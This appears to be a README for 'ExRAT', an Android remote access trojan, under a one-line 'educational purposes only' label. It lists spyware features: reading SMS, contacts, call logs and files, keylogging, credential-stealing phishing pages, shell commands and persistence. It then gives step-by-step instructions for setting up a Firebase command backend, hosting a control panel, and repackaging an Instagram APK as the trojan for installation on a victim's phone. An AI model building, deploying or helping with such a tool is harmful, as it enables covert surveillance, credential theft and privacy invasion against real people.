# ExRAT
TO BE USED FOR EDUCATIONAL PURPOSES ONLY




A multifunctional Android RAT with GUI based Web Panel without port forwarding.
Features
Read all the files of Internal Storage
Download Any Media to your Device from Victims Device
Get all the system information of Victim Device
Retrieve the List of Installed Applications
Retrive SMS
Retrive Call Logs
Retrive Contacts
Send SMS
Gets all the Notifications
Keylogger
Admin Permission
Show Phishing Pages to steal credentials through notification.
Steal credentials through pre built phishing pages
Open any suspicious website through notification to steal credentials.
Record Audio
Play music in Victim's device
Vibrate Device
Text To Speech
Change Wallpaper
Run shell Commands
Pre Binded with Instagram Webview Phishing
Runs In Background
Auto Starts on restarting the device
Auto Starts when any notification arrives
No port forwarding needed
Requirements
Firebase Account
ApkEasy Tool ( For PC ) or ApkTool M ( for Android)
How to Build
Firebase Setup
Create an Firebase Account and afterwords create a new project with any name.
Enable Firebase Database and Firebase Storage.
In Firebase Database Click on the rules and set .read and .write to true
    {
     "rules": {
             ".read": "true",
             ".write": "true"
              }
    }
In Firebase Storage allow reads and writes for all paths.
  rules_version = '2';
  service firebase.storage {
  match /b/{bucket}/o {
      match /{allPaths=**} {
         allow read, write 
        }
    }
 }
Now Go to project overview and create an Android App and download the google-services.json file.
Also create a web app and copy the config of webapp.
Panel Setup
You can use Github Pages or any Hosting Website for hosting the panel.
Open index.html File and from line number 16 replace the config with your web app config which you have created on Step 6.
Save the file , Your Panel Setup is completed.
Android RAT
Download Instagram.apk
Decompile it using any Decompiler recommend above.
Now open res/values/strings.xml file.
Replace values of firebase_database_url , google_api_key , google_app_id , google_storage_bucket , project_id with your Firebase Account using google-services.json file which you have downloaded on step 5
Example
<string name="firebase_database_url">https://your_database_url.firebase.com</string>
<string name="google_api_key">your_api_key</string>
<string name="google_app_id">your_app_id</string>
<string name="google_storage_bucket">your_storage_bucket_url</string>
<string name="project_id">project_id</string>
Now compile the code with appt2.
Install the app in victim's device and give all the permissions after that the connection will show up in web panel.
